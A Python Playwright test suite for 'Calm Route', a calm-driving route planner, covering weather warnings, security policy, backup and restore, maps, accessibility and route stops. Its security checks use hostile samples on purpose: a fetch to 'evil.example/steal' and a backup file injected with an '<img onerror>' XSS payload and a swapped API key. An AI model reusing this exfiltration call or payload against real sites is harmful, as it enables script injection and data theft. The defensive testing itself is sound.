"""Second batch of checks (the first file is near the 10-minute limit). Run: python3 test_more.py"""
import sys, json, datetime
sys.path.insert(0, '/home/claude/calm-route/test')
import test_app as T
from playwright.sync_api import sync_playwright
results = []
def check(name, ok, detail=None):
    results.append((name, bool(ok))); print(("PASS " if ok else "FAIL ") + name + ("" if ok else f"  {detail}"))

def fake_weather(page, kind):
    """kind: 'fine', 'snow' (snow from an hour in, clearing 3 hours later), 'alert' (snow + advisory), 'down'"""
    now = datetime.datetime.now(datetime.timezone(datetime.timedelta(hours=-5))).replace(minute=0, second=0, microsecond=0)
    def periods():
        out = []
        for h in range(-1, 12):
            st = now + datetime.timedelta(hours=h)
            snowy = kind in ("snow", "alert") and 0 <= h < 3
            out.append({"startTime": st.isoformat(), "endTime": (st + datetime.timedelta(hours=1)).isoformat(), "temperature": 30 if snowy else 45, "temperatureUnit": "F",
                        "shortForecast": "Snow Likely" if snowy else "Mostly Cloudy", "probabilityOfPrecipitation": {"value": 70 if snowy else 5}, "windSpeed": "10 mph"})
        return out
    page.calls_wx = []
    def h(route):
        u = route.request.url; page.calls_wx.append(u)
        if kind == "down": return route.abort("internetdisconnected")
        if "/points/" in u: return route.fulfill(status=200, content_type="application/json", body=json.dumps({"properties": {"forecastHourly": "https://api.weather.gov/gridpoints/GRR/45,12/forecast/hourly"}}))
        if "/forecast/hourly" in u: return route.fulfill(status=200, content_type="application/json", body=json.dumps({"properties": {"periods": periods()}}))
        if "/alerts/active" in u:
            feats = [{"properties": {"event": "Winter Weather Advisory", "status": "Actual", "ends": (now + datetime.timedelta(hours=6)).isoformat()}},
                     {"properties": {"event": "Air Quality Alert", "status": "Actual"}}] if kind == "alert" else []
            return route.fulfill(status=200, content_type="application/json", body=json.dumps({"features": feats}))
        return route.abort()
    page.route("https://api.weather.gov/**", h)

def trip(page):
    page.fill("#from", "42.2005, -85.6225"); page.wait_for_selector("#from-s [role=option]"); page.locator("#from-s [role=option]").first.dispatch_event("mousedown")
    page.evaluate("state.to = {main:'McDonald\\'s', sub:'', lat:42.2390, lon:-85.5500, full:'x'}; $('to').value = 'McDonald\\'s'")
    page.click("#find"); page.wait_for_function("state.routes.length > 0 && !document.getElementById('app').classList.contains('busy')", timeout=30000)

with sync_playwright() as p:
    b = p.chromium.launch(executable_path="/usr/bin/google-chrome", args=["--no-sandbox"])
    # Weather along the drive
    for kind in ("fine", "snow", "alert", "down"):
        page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
        fake_weather(page, kind); trip(page)
        if kind != "down": page.wait_for_selector("#wxNote:not([hidden])", timeout=15000)
        else: page.wait_for_timeout(3000)
        txt = page.text_content("#wxNote") if page.locator("#wxNote:not([hidden])").count() else ""
        if kind == "fine":
            check("clear weather: a short reassuring line with the temperature", "Weather looks fine for this drive." in txt and "45°F" in txt, txt)
            n_points = len([u for u in page.calls_wx if "/points/" in u])
            check("the forecast is checked at several points along the route (start, end and between)", n_points >= 2, page.calls_wx)
        elif kind == "snow":
            check("snow ahead: says what, roughly where in the drive and when, with the chance", "Snow likely" in txt and ("minutes in" in txt or "when you arrive" in txt or "as you leave" in txt) and "70% chance" in txt, txt)
            check("with a calm, practical tip", "leave extra space" in txt, txt)
            check("and when it should ease if waiting is an option", "leaving after about" in txt, txt)
            check("snow is shown in the caution colour", "l2" in page.get_attribute("#wxNote", "class"))
        elif kind == "alert":
            check("official driving-related alerts are shown, others (air quality) are left out", "Winter Weather Advisory" in txt and "Air Quality" not in txt, txt)
            check("alerts use the alert colour", "alert" in page.get_attribute("#wxNote", "class"))
        else:
            check("if the weather service is down, nothing breaks and nothing is shown", txt == "" and page.evaluate("state.routes.length") > 0 and not page.errors, [txt, page.errors])
        check(f"no errors with weather ({kind})", not page.errors, page.errors)
        page.context.close()
    # Outside the US: the NWS isn't asked
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}"); fake_weather(page, "snow")
    page.evaluate("state.trip = {from:{lat:51.5, lon:-0.12}, to:{lat:51.6, lon:-0.1}}; state.fast = null; loadWeather(state.trip)")
    page.wait_for_timeout(500)
    check("outside the US the weather service isn't asked", page.calls_wx == [] and page.locator("#wxNote").is_hidden())
    page.context.close()
    r = None
    page = T.new_page(b, profile={})
    kinds = page.evaluate("""[['Freezing Rain', 40], ['Chance Snow Showers', 50], ['Slight Chance Rain Showers', 20], ['Patchy Fog', 0], ['Rain', 80], ['Sunny', 0]]
        .map(([f, pop]) => { const k = wxKind({shortForecast:f, probabilityOfPrecipitation:{value:pop}, windSpeed:'10 mph'}); return k ? k.key + k.level : null; })""")
    check("forecast words are read sensibly (slight chances and sunshine aren't mentioned)", kinds == ["ice3", "snow2", None, "fog2", "rain1", None], kinds)
    check("strong wind is mentioned", page.evaluate("wxKind({shortForecast:'Sunny', windSpeed:'20 to 35 mph'}).key") == "wind")
    page.context.close()
    # Security policy and library fingerprints
    html = T.APP.read_text(encoding="utf-8")
    check("the page carries a security policy that only allows its own script and the services it uses",
          "Content-Security-Policy" in html and "default-src 'none'" in html and "object-src 'none'" in html and "'unsafe-eval'" not in html and "script-src 'self' file: https://cdnjs.cloudflare.com;" in html)
    import re as _re
    check("the page has no inline script: all code is in js/calm-route.js, so the policy needs no fingerprint to keep in step",
          not _re.search(r"<script>(?!\s*</script>)", html) and '<script src="js/calm-route.js"></script>' in html and "'sha256-" not in html)
    check("Leaflet is loaded with a fingerprint, so a tampered copy is refused",
          'leaflet.min.js" integrity="sha384-NElt3Op+9NBMCYaef5HxeJmU4Xeard/Lku8ek6hoPTvYkQPh3zLIrJP7KiRocsxO" crossorigin="anonymous"' in html
          and 'leaflet.min.css" integrity="sha384-c6Rcwz4e4CITMbu/NBmnNS8yN2sC3cUElMEMfP3vqqKFp7GOYaaBBCqmaWBjmkjb" crossorigin="anonymous"' in html)
    def poll(page, js, secs=20):
        for _ in range(secs * 10):
            if page.evaluate(js): return True
            page.wait_for_timeout(100)
        return False
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}", csp=True)
    fake_weather(page, "snow")
    page.fill("#from", "42.2005, -85.6225"); page.wait_for_selector("#from-s [role=option]"); page.locator("#from-s [role=option]").first.dispatch_event("mousedown")
    page.evaluate("state.to = {main:'McDonald\\'s', sub:'', lat:42.2390, lon:-85.5500, full:'x'}; $('to').value = 'McDonald\\'s'")
    page.click("#find"); poll(page, "state.routes.length > 0 && state.routes.every(r => !r.pending) && !$('wxNote').hidden")
    page.click("#editProfile"); page.click("#sheetClose")
    check("with the security policy on, a full search with road details and weather works", page.evaluate("state.routes.length > 0 && !$('wxNote').hidden"))
    page.evaluate("fetch('https://evil.example/steal').catch(() => {})"); page.wait_for_timeout(300)
    check("the policy blocks the page from sending data anywhere unexpected", any("CSP blocked connect-src" in e and "evil.example" in e for e in page.errors), page.errors)
    check("and blocks nothing the app itself needs", [e for e in page.errors if "evil.example" not in e] == [], page.errors)
    page.context.close()

    # Your data: back up, restore, delete
    page = T.new_page(b, profile={"merge":3, "worry":"panic"}, query=f"?stadiaKey={T.STADIA_KEY}")
    page.evaluate("localStorage.setItem('calmRoutePlaces', JSON.stringify({home:{main:'Home', sub:'', lat:42.1953, lon:-85.6168}, recent:[]}))")
    page.click("#editProfile")
    with page.expect_download() as dl: page.click("#dataSave")
    path = dl.value.path(); backup = json.loads(open(path).read())
    check("a backup file can be saved, with the profile and places", backup["app"] == "Calm Route" and "calmRouteProfile" in backup["data"] and "calmRoutePlaces" in backup["data"])
    check("the backup never includes the app owner's Stadia key", "calmRouteStadiaKey" not in backup["data"])
    page.click("#dataWipe"); check("deleting asks first, in the page (no pop-up)", page.locator("#dataConfirm").is_visible() and page.dialogs == [])
    page.click("#dataWipeNo"); check("and 'Keep my data' keeps it", page.evaluate("localStorage.getItem('calmRouteProfile')") is not None)
    page.click("#dataWipe"); page.click("#dataWipeYes")   # checked before the reload (the test itself re-adds a profile on every load)
    left = page.evaluate("Object.fromEntries(Object.keys(localStorage).filter(k => k.startsWith('calmRoute') && k !== 'calmRouteStadiaKey').map(k => [k, localStorage.getItem(k)]))")
    check("'Delete all my data' removes everything personal (profile, places, spots, drive log, car); the app's key stays",
          not any(k in left for k in ("calmRouteProfile", "calmRoutePlaces", "calmRouteAvoid", "calmRoutePractice", "calmRouteFuel", "calmRouteArea", "calmRouteScenicSeen")) and page.evaluate("!!localStorage.getItem('calmRouteStadiaKey')"), left)
    page.wait_for_timeout(1500); page.wait_for_load_state()
    for _ in range(50):
        if page.evaluate("!!window.L"): break
        page.wait_for_timeout(100)
    page.evaluate("localStorage.removeItem('calmRouteProfile')")
    if not page.evaluate("$('sheet').classList.contains('open')"): page.click("#editProfile")
    page.set_input_files("#dataLoad", path); page.wait_for_timeout(1500); page.wait_for_load_state()
    page.wait_for_function("window.L && document.getElementById('profileSummary')", timeout=10000)
    check("restoring the backup brings the profile and home back", page.evaluate("JSON.parse(localStorage.getItem('calmRouteProfile')).merge") == 3 and page.evaluate("!!JSON.parse(localStorage.getItem('calmRoutePlaces')).home"))
    page.context.close()
    # A booby-trapped backup can't inject anything
    evil = {"app": "Calm Route", "version": 1, "data": {"calmRoutePlaces": json.dumps({"home": {"main": "<img src=x onerror=window.__pwned=1>", "sub": "", "lat": 42.2, "lon": -85.6}, "recent": []}),
            "calmRouteFuel": json.dumps({"on": True, "car": {"grade": "<img src=x onerror=window.__pwned=1>"}, "prices": {"<img src=x onerror=window.__pwned=1>": 3.1}}),
            "calmRouteAvoid": json.dumps([{"id": "a", "lat": 42.2, "lon": -85.6, "label": "<img src=x onerror=window.__pwned=1>"}]),
            "evilKey": "x", "calmRouteStadiaKey": "attacker-key"}}
    open("/tmp/evil.json", "w").write(json.dumps(evil))
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    page.click("#editProfile"); page.set_input_files("#dataLoad", "/tmp/evil.json"); page.wait_for_timeout(1500); page.wait_for_load_state()
    page.wait_for_function("window.L && document.getElementById('profileSummary')", timeout=10000)
    page.click("#editProfile"); page.wait_for_timeout(300); page.click("#sheetClose")
    page.evaluate("document.querySelectorAll('details').forEach(d => d.open = true)"); page.wait_for_timeout(500)
    check("a booby-trapped backup can't run code in the page", page.evaluate("!window.__pwned"))
    check("a backup can't add other keys or swap the app's key", page.evaluate("localStorage.getItem('evilKey')") is None and page.evaluate("localStorage.getItem('calmRouteStadiaKey')") == T.STADIA_KEY)
    page.context.close()
    page = T.new_page(b, profile={}); page.click("#editProfile")
    open("/tmp/notabackup.json", "w").write('{"hello": 1}'); page.set_input_files("#dataLoad", "/tmp/notabackup.json"); page.wait_for_timeout(400)
    check("a file that isn't a backup is turned away politely", "isn’t a Calm Route backup" in page.text_content("#dataNote"))
    page.context.close()
    # Map background: Stadia's tiles with the key, OpenStreetMap's for the keyless demo; never Esri; credits shown
    T.calls["tiles"] = []
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}"); page.wait_for_timeout(800)
    tl = list(T.calls["tiles"])
    check("with the key, the map uses Stadia's tiles (with the key attached)", tl and all("tiles.stadiamaps.com/tiles/alidade_smooth/" in u and "api_key=" in u for u in tl), tl[:2])
    attr = page.text_content(".leaflet-control-attribution")
    check("the map credits Stadia, OpenMapTiles and OpenStreetMap contributors", all(w in attr for w in ("Stadia Maps", "OpenMapTiles", "OpenStreetMap contributors")), attr)
    check("Esri's unlicensed tiles are gone", "arcgisonline" not in T.all_source() and "Esri" not in attr)
    page.context.close()
    T.calls["tiles"] = []
    page = T.new_page(b, profile={}); page.wait_for_timeout(800)
    tl = list(T.calls["tiles"])
    check("without a key (demo), OpenStreetMap's tiles are used and credited", tl and all("tile.openstreetmap.org" in u for u in tl) and "OpenStreetMap contributors" in page.text_content(".leaflet-control-attribution"), tl[:2])
    page.click("#editProfile")
    body = page.text_content("#quizBody")
    check("the worry question is marked optional and says the answer stays on the device", "(optional)" in body and "stays on this device and is never sent anywhere" in body and "prefer not to say" in body)
    page.context.close()
    # The time slider is live
    page = T.new_page(b, profile={"merge":2, "boxed":2, "turns":0}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    calm_slow = page.evaluate("calmestOf(state.routes) !== state.fast")
    def slide(v): page.evaluate(f"(() => {{ const s = $('budget'); s.value = {v}; s.dispatchEvent(new Event('input', {{bubbles:true}})); }})()")
    slide(0); at0 = page.evaluate("state.sel === state.fast"); hint0 = page.text_content("#budgetHint")
    slide("$('budget').max"); atmax = page.evaluate("state.sel === calmestOf(state.routes)")
    check("sliding the time live switches between the fastest and calmer routes", calm_slow and at0 and atmax, [calm_slow, at0, atmax])
    check("at zero, the hint invites sliding for a calmer route", "Slide right" in hint0, hint0)
    page.context.close()
    page = T.new_page(b, profile={"merge":0, "boxed":0, "turns":0, "left":0, "bridge":0, "hills":0, "night":0, "dirt":0, "toll":0}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    if page.evaluate("calmestOf(state.routes) === state.fast"):
        check("when the fastest route is also the calmest, it says so plainly", "fastest route is also the calmest for you" in page.text_content("#budgetHint"), page.text_content("#budgetHint"))
    else:
        check("when the fastest route is also the calmest, it says so plainly", page.evaluate("(() => { state.routes.forEach(r => { if (r !== state.fast) r.turns += 50; }); update(false); return $('budgetHint').textContent; })()").find("also the calmest") >= 0)
    page.context.close()
    # Weather colours: four gentle levels with a word label
    for kind, tag, cls in (("fine", "Clear", "l0"), ("snow", "Take care", "l2"), ("alert", "Weather alert", "alert")):
        page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
        fake_weather(page, kind); trip(page); page.wait_for_selector("#wxNote:not([hidden])", timeout=15000)
        check(f"weather '{kind}' is labelled '{tag}' with its own soft colour", page.text_content("#wxNote .wxtag") == tag and cls in page.get_attribute("#wxNote", "class"), [page.text_content("#wxNote .wxtag"), page.get_attribute("#wxNote", "class")])
        if kind == "alert":
            col = page.evaluate("getComputedStyle($('wxNote')).backgroundColor")
            check("the alert colour is a soft tint, not a hard red", col == "rgb(252, 237, 232)", col)
        page.context.close()
    # Simple view
    page = T.new_page(b, profile={"merge":2, "boxed":2, "view":"simple"}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    vis = lambda sel: page.locator(sel).first.is_visible() if page.locator(sel).count() else False
    check("simple view shows only the recommended route", page.locator("#routes .route:visible").count() == 1 and page.evaluate("document.querySelector('#routes .route[aria-checked=true]').offsetParent !== null"))
    check("and hides the slider, strip, tricky-moments list and briefing", not vis(".budget") and not vis("#routes .strip") and not vis("#momentBox") and not vis("#briefBox"))
    check("it still shows the time, the summary line and the hand-off button", vis("#routes .route[aria-checked=true] .route-time") and vis("#routes .route[aria-checked=true] .moments") and vis("#gmaps"))
    check("only the recommended route is drawn on the map", page.evaluate("(() => { let n = 0; layer.eachLayer(l => { if (l instanceof L.Polyline && l.options.weight === 4) n++; }); return n; })()") == 0)
    page.click(".viewtoggle [data-view=full]")
    check("switching to Details brings everything back and remembers it", page.locator("#routes .route:visible").count() > 1 and vis(".budget") and page.evaluate("JSON.parse(localStorage.getItem('calmRouteProfile')).view") == "full")
    page.click(".viewtoggle [data-view=simple]")
    check("and back to Simple", page.locator("#routes .route:visible").count() == 1)
    page.click("#editProfile")
    check("the profile asks how much detail, with 'Just the calm pick (I trust Calm Route)'", "How much detail do you want?" in page.text_content("#quizBody") and "I trust Calm Route" in page.text_content("#quizBody"))
    check("no errors in simple view", not page.errors, page.errors)
    page.context.close()
    # Accessibility: axe finds nothing on any screen; keyboard works end to end; focus is visible
    AXE = open(str(T.APP.parent / "test/node_modules/axe-core/axe.min.js")).read() if (T.APP.parent / "test/node_modules/axe-core/axe.min.js").exists() else None
    def axe(page):
        page.evaluate(AXE)
        return page.evaluate("axe.run(document, {runOnly:{type:'tag', values:['wcag2a','wcag2aa','wcag21a','wcag21aa','best-practice']}}).then(r => r.violations.map(v => v.id + ' x' + v.nodes.length))")
    if AXE:
        page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
        found = {"home": axe(page)}
        page.click("#editProfile"); page.wait_for_timeout(300); found["profile"] = axe(page); page.click("#sheetClose")
        fake_weather(page, "snow"); trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000); page.wait_for_timeout(500)
        page.evaluate("document.querySelectorAll('details').forEach(d => d.open = true)"); found["results"] = axe(page)
        page.click(".viewtoggle [data-view=simple]"); found["simple"] = axe(page)
        check("the axe accessibility checker finds no problems (WCAG 2.1 AA) on home, profile, results and simple view", all(v == [] for v in found.values()), found)
        page.context.close()
    else:
        check("axe-core is installed for the accessibility check (cd test && npm install axe-core)", False)
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    page.focus("#from"); page.keyboard.insert_text("42.2005, -85.6225"); page.wait_for_selector("#from-s [role=option]"); page.keyboard.press("ArrowDown"); page.keyboard.press("Enter")
    page.focus("#to"); [page.keyboard.insert_text(c) for c in "mcdonalds"]; page.wait_for_selector("#to-s [role=option]"); page.wait_for_timeout(300); page.keyboard.press("ArrowDown"); page.keyboard.press("Enter")
    page.focus("#find"); page.keyboard.press("Enter"); page.wait_for_function("state.routes.length > 1 && state.routes.every(r => !r.pending)", timeout=30000)
    page.focus("#routes .route[aria-checked=true]"); before = page.evaluate("state.routes.indexOf(state.sel)"); page.keyboard.press("ArrowDown"); page.wait_for_timeout(200)
    check("keyboard only: pick both places, find routes and move between them", page.evaluate("state.routes.indexOf(state.sel)") != before)
    page.focus("#editProfile"); page.keyboard.press("Enter"); page.wait_for_timeout(300)
    inside = []
    for _ in range(40): page.keyboard.press("Tab"); inside.append(page.evaluate("$('sheet').contains(document.activeElement)"))
    page.keyboard.press("Escape"); page.wait_for_timeout(200)
    check("the profile keeps keyboard focus inside and Escape closes it, returning focus", all(inside) and page.evaluate("document.activeElement.id") == "editProfile")
    ring = page.evaluate("(() => { $('from').focus(); return getComputedStyle($('from')).boxShadow; })()")
    check("the focus ring on the address boxes is a solid dark colour", "rgb(46, 106, 138)" in ring, ring)
    page.context.close()
    page = T.new_page(b, profile={}, width=320, height=640, mobile=True, query=f"?stadiaKey={T.STADIA_KEY}"); trip(page)
    check("at 320 px wide (the accessibility reflow width) nothing scrolls sideways", page.evaluate("document.documentElement.scrollWidth <= innerWidth"))
    page.context.close()
    # Roads you like
    T.calls["liked"] = []
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    mid = page.evaluate("(() => { const s = state.fast.shape; return s[Math.floor(s.length * 0.35)]; })()")
    page.evaluate("ll => map.fire('contextmenu', {latlng: L.latLng(ll[0], ll[1])})", mid)
    page.wait_for_selector("[data-addlike]")
    check("press-and-hold (or right-click) on the map offers 'I like this road' next to 'Avoid this spot'", page.locator("[data-addspot]").count() == 1 and "I like this road" in page.text_content("[data-addlike]"))
    page.click("[data-addlike]")
    page.wait_for_function("likedRoads.length === 1 && state.trip && state.trip.likedVia && state.routes.length && state.routes.every(r => !r.pending)", timeout=30000)
    check("the liked road is saved with its name, taken from the route under the finger", page.evaluate("likedRoads[0].name") in ("Main Street", "Oakland Drive", "Westnedge Avenue") and page.evaluate("JSON.parse(localStorage.getItem('calmRouteLiked')).length") == 1, page.evaluate("likedRoads"))
    check("routes are found again, including one that passes along the liked road", len(T.calls["liked"]) >= 1 and T.calls["liked"][0]["locations"][1]["type"] == "through")
    lm = page.evaluate("state.routes.map(r => +r.likedMiles.toFixed(2))")
    check("miles on the liked road are counted on each route", any(m > 0 for m in lm), lm)
    check("the card says so: 'Uses …, a road you like'", "a road you like" in page.text_content("#routes"), page.text_content("#routes")[:300])
    r = page.evaluate("(() => { const r = state.routes.find(x => x.likedMiles > 0); return [stressBase(r), stressOf(r), Math.min(0.6 * r.likedMiles, 0.4 * stressBase(r))]; })()")
    check("the liked road lowers the route's stress, but never by more than 40%", r[1] < r[0] and abs((r[0] - r[1]) - r[2]) < 1e-9 and r[1] >= 0.6 * r[0] - 1e-9, r)
    check("the liked road shows on the map with a heart", page.locator(".map-like").count() == 1)
    page.click("#editProfile")
    check("the profile lists roads you like", page.evaluate("likedRoads[0].name") in page.text_content("#likedList"))
    page.click("#likedList [data-unlike]")
    page.wait_for_function("likedRoads.length === 0 && state.trip && state.routes.length && state.routes.every(r => !r.pending)", timeout=30000)
    check("removing it clears the bonus and the heart", page.evaluate("state.routes.every(r => !r.likedMiles)") and page.locator(".map-like").count() == 0)
    check("no errors with liked roads", not page.errors, page.errors)
    page.context.close()
    # A liked road far from the trip isn't used
    page = T.new_page(b, profile={})
    check("a liked road far off the trip doesn't pull the route", page.evaluate("(() => { likedRoads.push({id:'x', lat:43.5, lon:-84.0, name:'Far Road'}); const v = likedViaFor({lat:42.2005, lon:-85.6225}, {lat:42.2390, lon:-85.5500}); likedRoads.pop(); return v; })()") is None)
    page.context.close()
    # A stop on the way
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    mid = page.evaluate("state.sel.shape[Math.floor(state.sel.shape.length / 2)]"); T.STOP_AT[0], T.STOP_AT[1] = mid[0], mid[1]
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000)
    items = page.locator("#stopList li").all_inner_texts()
    check("Gas finds stations by brand along the route, and leaves out ones far off it and fire stations", items and "Speedway" in items[0] and "right on the route" in items[0] and not any("Fire" in i or "Kalamazoo" in i for i in items) and len(items) <= 5, items)
    page.click("#stopBox [data-stop=food]"); page.wait_for_timeout(1500)
    check("a name that only looks like a brand (\"Jena King\" for Burger King) isn't offered", "Jena King" not in page.text_content("#stopList"), page.text_content("#stopList"))
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000)
    T.calls["sim"].clear()
    page.click("#stopList [data-addstop]")
    page.wait_for_function("state.trip && state.trip.stops.length && state.routes.length && !$('app').classList.contains('busy')", timeout=30000)
    page.wait_for_timeout(1500)
    check("adding the stop sends the routes through it", any(len(b_["locations"]) >= 3 and abs(b_["locations"][1]["lat"] - T.STOP_AT[0]) < 1e-3 for b_ in T.calls["sim"]), len(T.calls["sim"]))
    check("the stop is shown, with a way to remove it", "Speedway" in page.text_content("#stopLabel") and page.locator("#stopLabel .stopRemove").count() == 1)
    link = page.get_attribute("#gmaps", "href") or ""
    sp = f"{T.STOP_AT[0]:.6f}%2C{T.STOP_AT[1]:.6f}"
    from urllib.parse import unquote_plus
    check("Google Maps gets the stop as its exact point, not a written address that may be wrong", sp.replace("%2C", ",") in unquote_plus(link) and "Main Street" not in unquote_plus(link), unquote_plus(link)[:240])
    page.click("#stopLabel .stopRemove"); page.wait_for_function("state.trip && !state.trip.stops.length && !$('app').classList.contains('busy')", timeout=30000)
    check("removing the stop routes without it again", page.text_content("#stopLabel") == "Need a stop on the way?")
    check("no errors with stops", not page.errors, page.errors)
    page.context.close()
    # Need gas: the easiest station near the start, preferring the right side of the road
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    pts = page.evaluate("""(() => { const s = state.sel.shape, c = state.sel.cum;
        const pick = mi => { const i = c.findIndex(x => x >= mi); const a = s[i], b = s[i + 1], kx = Math.cos(a[0] * Math.PI / 180);
          const dx = (b[1] - a[1]) * kx, dy = b[0] - a[0], L = Math.hypot(dx, dy), off = 0.0004;
          return {right:[a[0] - dx / L * off, a[1] + dy / L * off / kx], left:[a[0] + dx / L * off, a[1] - dy / L * off / kx]}; };
        return {early:pick(0.8), later:pick(1.6)}; })()""")
    T.LEFT_AT[0], T.LEFT_AT[1] = pts["early"]["left"]       # Shell: closer to the start, but on the left
    T.STOP_AT[0], T.STOP_AT[1] = pts["later"]["right"]      # Speedway: a little later, on the right
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000)
    items = page.locator("#stopList li").all_inner_texts()
    check("stations are labelled by side, and the one on the right ranks first even if a left-side one is nearer the start",
          len(items) >= 2 and "Speedway" in items[0] and "on your right" in items[0] and "Shell" in items[1] and ("on your left" in items[1] or "at a turn" in items[1]), items)
    page.context.close()
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    page.check("#needGas")
    T.calls["sim"].clear(); trip(page)
    page.wait_for_function("state.trip && state.trip.stops.length && !$('app').classList.contains('busy')", timeout=30000)
    check("with 'Need gas' on, the routes automatically go through the easiest station", page.evaluate("state.trip.stops[0].main") == "Speedway" and "Gas:" in page.text_content("#stopLabel") and "on your right" in page.text_content("#stopLabel"), page.text_content("#stopLabel"))
    page.click("#stopLabel .stopRemove"); page.wait_for_function("state.trip && !state.trip.stops.length && !$('app').classList.contains('busy')", timeout=30000)
    check("removing the gas stop also switches 'Need gas' off", not page.is_checked("#needGas"))
    check("no errors with Need gas", not page.errors, page.errors)
    page.context.close()
    T.LEFT_AT[0] = T.LEFT_AT[1] = 0
    # One stop at a time: Need gas and Need food are either/or
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    pts = page.evaluate("""(() => { const s = state.sel.shape, c = state.sel.cum, at = mi => s[c.findIndex(x => x >= mi)]; return {a:at(1.0), far:at(2.2)}; })()""")
    T.STOP_AT[0], T.STOP_AT[1] = pts["a"]; T.FOOD_AT[0], T.FOOD_AT[1] = pts["far"]
    page.check("#needGas")
    page.wait_for_function("state.trip && state.trip.stops.length && !$('app').classList.contains('busy') && state.routes.every(r => !r.pending)", timeout=30000)
    check("Need gas after the routes show adds the gas stop", page.evaluate("state.trip.stops.map(s => s.kind + ':' + s.main)") == ["gas:Speedway"])
    page.check("#needFood")
    page.wait_for_function("state.trip && state.trip.stops.length && state.trip.stops[0].kind === 'food' && !$('app').classList.contains('busy')", timeout=30000)
    check("Need food switches Need gas off and replaces the stop: one stop at a time",
          page.evaluate("state.trip.stops.map(s => s.kind + ':' + s.main)") == ["food:Wendy's"] and not page.is_checked("#needGas") and page.is_checked("#needFood"),
          page.evaluate("state.trip.stops.map(s => s.kind + ':' + s.main)"))
    check("only one Remove button", page.locator("#stopLabel .stopRemove").count() == 1)
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000); page.click("#stopList [data-addstop]")
    page.wait_for_function("state.trip && state.trip.stops.length && state.trip.stops[0].kind === 'gas' && !$('app').classList.contains('busy')", timeout=30000)
    check("adding a gas stop by hand replaces the food stop and turns Need food off", page.evaluate("state.trip.stops.length") == 1 and not page.is_checked("#needFood"))
    page.uncheck("#needGas") if page.is_checked("#needGas") else None
    page.context.close()
    # The automatic pick must be right on the road: a station a block off (or behind a corner) is not picked
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    p0 = page.evaluate("""(() => { const s = state.sel.shape, c = state.sel.cum, i = c.findIndex(x => x >= 1.0), a = s[i], b = s[i + 1], kx = Math.cos(a[0] * Math.PI / 180);
        const dx = (b[1] - a[1]) * kx, dy = b[0] - a[0], L = Math.hypot(dx, dy), off = 0.0030;       // about 0.2 mi off
        return [a[0] - dx / L * off, a[1] + dy / L * off / kx]; })()""")
    T.STOP_AT[0], T.STOP_AT[1] = p0; T.FOOD_AT[0] = T.FOOD_AT[1] = 0
    page.check("#needGas"); page.wait_for_function("/No gas station right on this route/.test($('status').textContent)", timeout=30000)
    check("Need gas skips a station 0.2 mi off the route and says so", not page.evaluate("state.stops.length") and "Press Gas" in page.text_content("#status"), page.text_content("#status"))
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList li", timeout=10000)
    check("but the Gas button still lists it, marked as off the route", "off the route" in page.text_content("#stopList"), page.text_content("#stopList"))
    check("no errors with one stop at a time", not page.errors, page.errors)
    page.context.close()
    T.FOOD_AT[0] = T.FOOD_AT[1] = 0
    # A stop that already keeps the map app on the calm road takes the place of pinned points
    page = T.new_page(b, profile={}, query=f"?stadiaKey={T.STADIA_KEY}")
    trip(page); page.wait_for_function("state.routes.every(r => !r.pending)", timeout=20000)
    calm = page.evaluate("state.routes.findIndex(r => r !== state.fast)")
    if calm >= 0: page.evaluate(f"selectRoute({calm})")
    page.wait_for_function("state.sel.pinPlan && state.sel.pinPlan.done", timeout=30000)
    before = page.evaluate("pinInfo().pins.length")
    mid = page.evaluate("state.sel.shape[Math.floor(state.sel.shape.length / 2)]"); T.STOP_AT[0], T.STOP_AT[1] = mid[0], mid[1]
    T.STOP_FIXES["on"] = True
    page.click("#stopBox [data-stop=gas]"); page.wait_for_selector("#stopList [data-addstop]", timeout=10000); page.click("#stopList [data-addstop]")
    page.wait_for_function("state.trip && state.trip.stops.length && !$('app').classList.contains('busy') && state.sel && state.sel.pinPlan && state.sel.pinPlan.done", timeout=30000)
    after = page.evaluate("pinInfo().pins.length")
    check("a stop on the calm road replaces pinned points it makes unneeded", before >= 1 and after < before and "beyond your stop" in page.text_content("#detailNote"), [before, after, page.text_content("#detailNote")])
    check("the stop shows on the map with its own marker", page.locator(".map-stop").count() == 1)
    check("no errors with the stop replacing pins", not page.errors, page.errors)
    T.STOP_FIXES["on"] = False
    page.context.close()
    # Privacy note, feedback link, Simple view for new drivers, Indiana and Ohio lights
